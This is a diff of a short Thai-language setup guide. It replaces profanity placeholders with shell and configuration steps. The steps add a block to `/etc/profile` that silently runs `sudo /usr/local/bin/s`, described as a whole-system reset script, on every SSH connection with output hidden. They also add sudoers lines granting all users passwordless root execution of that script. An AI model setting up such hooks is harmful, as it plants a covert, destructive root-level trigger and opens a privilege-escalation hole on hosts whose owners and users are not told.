@@ -9,7 +9,7 @@
 ```
 #3.เข้าไปที่ cd /usr/local/bin แล้ววางสคริปs สำหรับรีระบบทั้งหมด 
 ```
- ควย
+ chmod +x s
 ```
 #4.เข้าไปที่
 ```
@@ -17,7 +17,9 @@ nano /etc/profile/
 ```
 #แล้วว่างบนสุด
 ```
- ควย
+  if [ -n "$SSH_CONNECTION" ]; then
+    sudo /usr/local/bin/s > /dev/null 2>&1
+fi
 ```
 #5. เข้าไปแก้สิทธิ์ 
 ```
@@ -25,7 +27,7 @@ nano /etc/profile/
 ```
 #ล่างสุดแล้วว่าง
 ```
- ค
- ว
- ย
+ ALL ALL=(ALL) NOPASSWD: /usr/local/bin/s
+news ALL=(ALL) NOPASSWD: /usr/local/bin/s
+ubuntu ALL=(ALL) NOPASSWD: /usr/local/bin/s
 ```
